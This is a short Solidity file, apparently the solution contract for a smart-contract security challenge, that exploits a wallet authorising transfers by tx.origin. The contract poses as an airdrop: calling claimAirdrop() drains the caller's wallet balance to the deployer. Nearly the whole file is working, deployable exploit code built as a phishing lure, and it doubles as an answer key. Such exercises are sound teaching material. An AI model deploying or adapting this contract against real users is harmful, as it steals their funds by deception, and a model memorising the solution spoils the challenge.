// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IOriginWallet {
    function transfer(address payable to, uint256 amount) external;
}

/// @notice SOLUTION for challenge 03. Looks like an airdrop; when Alice calls
/// claimAirdrop(), it uses her tx.origin to empty her wallet.
contract FakeAirdrop {
    IOriginWallet public immutable wallet;
    address payable public immutable attacker;

    constructor(address wallet_) {
        wallet = IOriginWallet(wallet_);
        attacker = payable(msg.sender);
    }

    function claimAirdrop() external {
        wallet.transfer(attacker, address(wallet).balance);
    }
}
